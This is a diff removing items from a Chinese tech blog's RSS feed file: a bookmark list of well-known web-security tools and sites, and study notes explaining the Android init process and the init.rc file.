 &lt;/ol&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/07/17/url-log/</guid>
-            <title>web 安全相关网站资源记录</title>
-            <link>http://ericcd.com/2022/07/17/url-log/</link>
-            <category term="web" scheme="http://ericcd.com/categories/web/" />
-            <category term="web" scheme="http://ericcd.com/tags/web/" />
-            <pubDate>Sun, 17 Jul 2022 15:14:42 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录一些学习到的 web 安全相关网站。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==&#34;&gt;https://www.shodan.io/&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=&#34;&gt;https://www.webscan.cc/&lt;/span&gt; （同 ip 查询）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcnQuc2gv&#34;&gt;https://crt.sh/&lt;/span&gt; （子域名查询）&lt;/p&gt;
-&lt;h1 id=&#34;学习资源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#学习资源&#34;&gt;#&lt;/a&gt; 学习资源&lt;/h1&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2luZGV4Lmh0bWw=&#34;&gt;https://websec.readthedocs.io/zh/latest/index.html&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;扫描工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扫描工具&#34;&gt;#&lt;/a&gt; 扫描工具&lt;/h1&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ubWFwLm9yZy8=&#34;&gt;https://nmap.org/&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hlbGxvZ29sZHNuYWtlbWFuL21hc25tYXBzY2FuLVYxLjA=&#34;&gt;https://github.com/hellogoldsnakeman/masnmapscan-V1.0&lt;/span&gt;  （端口扫描器）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;  （WAF 扫描工具）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vdGVlbW8=&#34;&gt;https://github.com/bit4woo/teemo&lt;/span&gt; （域名枚举工具）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==&#34;&gt;https://github.com/fuzzdb-project/fuzzdb&lt;/span&gt; （Fuzz 工具）&lt;/p&gt;
-&lt;h1 id=&#34;相关资源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关资源&#34;&gt;#&lt;/a&gt; 相关资源&lt;/h1&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0x1Y2lmZXIxOTkzL2Ntc3ByaW50&#34;&gt;https://github.com/Lucifer1993/cmsprint&lt;/span&gt;  （CMS 指纹库）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL000dGlyL0dpdGh1Yi1Nb25pdG9y&#34;&gt;https://github.com/M4tir/Github-Monitor&lt;/span&gt; （漏洞发布监控工具）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzkzMjYyNTguaHRtbA==&#34;&gt;https://www.cnblogs.com/bmjoker/p/9326258.html&lt;/span&gt; （sqlmap 思维导图）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3Rz&#34;&gt;https://github.com/TheKingOfDuck/fuzzDicts&lt;/span&gt; （Fuzz 字典）&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==&#34;&gt;https://github.com/s0md3v/XSStrike&lt;/span&gt; （XSS 绕过工具）&lt;/p&gt;
-&lt;h1 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lvdW5neWFuZ3lhbmcwNC9Ob1NRTEF0dGFjaw==&#34;&gt;https://github.com/youngyangyang04/NoSQLAttack&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;https://github.com/sqlmapproject/sqlmap&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NleWUuaW8v&#34;&gt;http://ceye.io/&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FET09PL0Ruc2xvZ1NxbGluag==&#34;&gt;https://github.com/ADOOO/DnslogSqlinj&lt;/span&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/03/31/Android-Framework-init-rc/</guid>
-            <title>Android 框架 - init.rc 文件</title>
-            <link>http://ericcd.com/2022/03/31/Android-Framework-init-rc/</link>
-            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
-            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
-            <pubDate>Thu, 31 Mar 2022 11:26:29 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;Android 框架中 init.rc 文件的相关知识。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
-init.rc 文件不同于 init 进程，init 进程仅当编译完 Android 后才会生成，而 init.rc 文件存在于源码中。init 文件大致分为两部分，一部分是以 on 关键字开头的动作列表，一部分是以 service 关键字开头的服务列表。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/03/23/AndroidFramework-init/</guid>
-            <title>Android 框架 - init 进程</title>
-            <link>http://ericcd.com/2022/03/23/AndroidFramework-init/</link>
-            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
-            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
-            <pubDate>Wed, 23 Mar 2022 11:25:48 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;Android 框架中 init 进程的相关知识。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
-init 进程是 Android 启动后，由内核启动的第一个用户级进程。&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 内核启动过程：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    start_kernel ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    init_post ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    run_init_process ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     static in noinline init_post (void)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               if (execute_command)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                          run_init_process (execute_command);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/sbin/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/etc/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/bin/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/bin/sh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
-init_post () 函数调用 run_init_process () 函数，获取注册在 execute_command 中的进程文件路径，执行 execve () 系统调用，execve () 函数执行参数传递过来的文件路径下的进程 。&lt;br /&gt;
-当跟文件系统顶层目录中不存在 init 进程或未指定启动选项 &amp;quot;init=&amp;quot; 时，内核会到 /sbin,/etc,/bin 目录下查找 init 文件，如果仍未找到，则 init 进程停止，引发 Kernel Panic。&lt;/p&gt;
-&lt;h1 id=&#34;init-工作流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#init-工作流程&#34;&gt;#&lt;/a&gt; init 工作流程&lt;/h1&gt;
-&lt;h2 id=&#34;sigchld-注册信号处理器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sigchld-注册信号处理器&#34;&gt;#&lt;/a&gt; SIGCHLD 注册信号处理器&lt;/h2&gt;
-&lt;p&gt;当子进程终止时，会产生 SIGCHLD 信号，init 进程调用信号安装函数 sigaction ()，并通过参数传递至 sigaction 结构体中，完成信号处理器安装。&lt;br /&gt;
-init 进程通过相关代码注册与子进程相关的 SIGCHLD 信号处理器，并把 sigaction 结构体中的 sa_flags 设置为 SA_NOCLDSTOP，该值表示仅当进程终止时才接受 SIGCHLD 信号。sigchld_handler 函数用于通知全局变量 signal_fd，SIGCHLD 信号已经发生。&lt;/p&gt;
-&lt;h2 id=&#34;main-目录生成与挂载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#main-目录生成与挂载&#34;&gt;#&lt;/a&gt; main () 目录生成与挂载&lt;/h2&gt;
-&lt;p&gt;init 在注册完信号处理器后，创建并挂在启动所需目录。&lt;/p&gt;
-&lt;h2 id=&#34;初始化-log-输出设备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#初始化-log-输出设备&#34;&gt;#&lt;/a&gt; 初始化 log 输出设备&lt;/h2&gt;
-&lt;p&gt;通过调用 log_init () 函数初始化 log 输出设备。&lt;/p&gt;
-&lt;h2 id=&#34;解析-initrc-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析-initrc-文件&#34;&gt;#&lt;/a&gt; 解析 init.rc 文件&lt;/h2&gt;
-&lt;p&gt;init.rc 文件是 init 启动后执行的启动脚本，文件中记录着 init 进程执行的功能。在 Linux 系统中，它被定义在根文件系统的 /etc/rc.d/ 目录下，是启动时的可执行文件。&lt;br /&gt;
-init.rc 文件在 Android 系统运行过程中用于通用的环境设置以及进程相关的定义，init.{hardware}.rc 用于定义 Android 在不同平台下的特定进程和环境设置等。&lt;br /&gt;
-parse_config_file () 文件用于分析.rc 配置文件，参数为文件路径。读取 init.rc 文件后，生成动作列表与服务列表。根据 init.{hardware}.rc 生成的动作列表和服务列表会被添加到已生成的对应列表中去。&lt;/p&gt;
-&lt;h2 id=&#34;执行-early-init-动作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行-early-init-动作&#34;&gt;#&lt;/a&gt; 执行 early-init 动作&lt;/h2&gt;
-&lt;p&gt;init 进程会依次执行 &amp;quot;early-init , init ,early-boot , boot&amp;quot; 片段中的命令。&lt;br /&gt;
-通过 action_for_each_trigger () 将 early-init 中的命令保存到队列 action_add_queue_tail 中，之后通过 drain_action_queue () 函数将运行队列中的命令逐一取出执行。&lt;/p&gt;
-&lt;h2 id=&#34;创建定义好的设备节点文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建定义好的设备节点文件&#34;&gt;#&lt;/a&gt; 创建定义好的设备节点文件&lt;/h2&gt;
-&lt;p&gt;通过 device_init () 生成静态设备节点。&lt;/p&gt;
-&lt;h2 id=&#34;初始化属性服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#初始化属性服务&#34;&gt;#&lt;/a&gt; 初始化属性服务&lt;/h2&gt;
-&lt;p&gt;调用 property_init () 函数，在共享内存区域中，创建并初始化属性域。而后通过执行中的进程所提供的 API，访问属性域中的设置值。但更改属性值操作只能在 init 进程中运行，当修改属性值时，要预先向 init 进程提交值变更申请，然后 init 进程处理该申请，并修改属性值。&lt;/p&gt;
-&lt;h2 id=&#34;显示启动-logo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显示启动-logo&#34;&gt;#&lt;/a&gt; 显示启动 logo&lt;/h2&gt;
-&lt;p&gt;使用 load_565rle_image () 函数将文件显示在屏幕上，只需修改 INIT_IMAGE_FILE 即可更改启动 Logo。&lt;/p&gt;
-&lt;h2 id=&#34;属性初始设置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#属性初始设置&#34;&gt;#&lt;/a&gt; 属性初始设置&lt;/h2&gt;
-&lt;p&gt;通过 property_set () 函数向属性域设置系统所需的一些初始值。这些设置的属性值由执行中的多种进程通过 property_get () API 来访问。&lt;/p&gt;
-&lt;h2 id=&#34;执行-init-动作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行-init-动作&#34;&gt;#&lt;/a&gt; 执行 init 动作&lt;/h2&gt;
-&lt;p&gt;同 early-init。&lt;/p&gt;
-&lt;h2 id=&#34;启动属性服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动属性服务&#34;&gt;#&lt;/a&gt; 启动属性服务&lt;/h2&gt;
-&lt;p&gt;除了先前设置的属性外，start_property_service () 还会读取几个设置文件，并对属性进行初始化。在根文件系统的 /data/property 目录下，保存着进程生成或修改的属性值。向 init 提交修改申请后，init 进程生成 /dev/socket/property_service 来接受其它进程提交的申请。&lt;/p&gt;
-&lt;h2 id=&#34;创建套接字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建套接字&#34;&gt;#&lt;/a&gt; 创建套接字&lt;/h2&gt;
-&lt;p&gt;用于 init 进程在收到子进程终止的信号时调用相应的 handler。&lt;/p&gt;
-&lt;h2 id=&#34;执行与-action-list-的-early-bootbootproperty-相关的命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行与-action-list-的-early-bootbootproperty-相关的命令&#34;&gt;#&lt;/a&gt; 执行与 Action List 的 early-boot,boot,property 相关的命令&lt;/h2&gt;
-&lt;p&gt;在 init.rc 文件的 boot 区段有一条 class_start 命令，用来逐一执行存在于服务列表中的进程列表。&lt;/p&gt;
-&lt;h2 id=&#34;设置事件处理循环的监视事件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设置事件处理循环的监视事件&#34;&gt;#&lt;/a&gt; 设置事件处理循环的监视事件&lt;/h2&gt;
-&lt;p&gt;注册在 POLL 中的文件描述符会在 poll () 函数中等待事件发生，若事件发生，则从 poll 函数中跳出并处理事件。&lt;br /&gt;
-在确认事件发生前，先要在 action list 的命令中确认是否有尚未执行的命令，并执行这些命令。起初，在事件处理循环中，action list 与 service list 未含有需要执行的事情，但是在处理过注册的事件后，init 进程要做的事情会重新注册到 action list 与 service list 中。&lt;br /&gt;
-当事件发生时，事件信息会保存在 pollfd 结构体的 udfs.revents 变量中，当 poll () 函数返回后，可以在 udfs 数组中的 revents 中查看哪些事件已经发生。&lt;br /&gt;
-当子进程终止时，会产生 SIGCHLD 信号，POLLIN 事件会被注册到 udfs [2],revents 中。&lt;br /&gt;
-在 Android 系统运行过程中，插入热的拔插设备时，将生成设备节点文件。&lt;br /&gt;
-这部分函数还会处理属性变更请求。&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
